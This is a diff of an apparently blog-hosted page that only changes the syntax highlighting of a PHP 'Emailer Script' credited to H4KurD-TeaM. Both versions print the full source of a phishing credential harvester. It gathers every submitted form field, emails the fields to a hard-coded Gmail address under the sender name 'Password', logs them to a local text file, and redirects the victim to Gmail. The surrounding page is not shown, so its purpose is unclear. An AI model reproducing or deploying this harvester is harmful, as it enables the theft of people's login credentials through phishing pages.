@@ -37,37 +37,36 @@
 
 <h3>Emailer Script Source Code</h3>
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 
-/* 
-H4KurD-TeaM
-www.h4kurd.com
-Coded By : Hangaw_HawlerY
-Email: Hangaw_HawlerY@Yahoo.com , Hangaw_HawlerY@Hotmail.com 
-All Right Reserved
-*/
+<span class="cm">/* </span>
+<span class="cm">H4KurD-TeaM</span>
+<span class="cm">www.h4kurd.com</span>
+<span class="cm">Coded By : Hangaw_HawlerY</span>
+<span class="cm">Email: Hangaw_HawlerY@Yahoo.com , Hangaw_HawlerY@Hotmail.com </span>
+<span class="cm">All Right Reserved</span>
+<span class="cm">*/</span>
 
-header ('Location: https://www.gmail.com');
+<span class="nb">header</span> <span class="p">(</span><span class="s1">&#39;Location: https://www.gmail.com&#39;</span><span class="p">);</span>
 
-$posts        = '';
-foreach($_POST as $k =&gt; $v){
-    $posts .= '$_POST['.$k.'] = '.$v."\n";
-}
+<span class="nv">$posts</span>        <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">){</span>
+    <span class="nv">$posts</span> <span class="o">.=</span> <span class="s1">&#39;$_POST[&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;] = &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="p">}</span>
 
-$posts       .= "---------------------------------------------------\n";
-$emailto    = 'pramod.sin321@gmail.com';
-$subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
-$from        = "From: Password &lt;h4kurd.team@gmail.com&gt;";
-$body        = '
-'.$posts.'
-';
+<span class="nv">$posts</span>       <span class="o">.=</span> <span class="s2">&quot;---------------------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="nv">$emailto</span>    <span class="o">=</span> <span class="s1">&#39;pramod.sin321@gmail.com&#39;</span><span class="p">;</span>
+<span class="nv">$subject</span>    <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;-&quot;</span><span class="o">.</span><span class="nv">$_SEREVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">];</span>
+<span class="nv">$from</span>        <span class="o">=</span> <span class="s2">&quot;From: Password &amp;lt;h4kurd.team@gmail.com&amp;gt;&quot;</span><span class="p">;</span>
+<span class="nv">$body</span>        <span class="o">=</span> <span class="s1">&#39;</span>
+<span class="s1">&#39;</span><span class="o">.</span><span class="nv">$posts</span><span class="o">.</span><span class="s1">&#39;</span>
+<span class="s1">&#39;</span><span class="p">;</span>
 
-@mail($emailto, $subject, $body, $from);
-$handle = @fopen("h4kurd.txt", "a+");
-@fwrite($handle, $posts);
-fclose($handle);
-?&gt;
-</pre>
+<span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$emailto</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$body</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
+<span class="nv">$handle</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;h4kurd.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a+&quot;</span><span class="p">);</span>
+<span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$posts</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
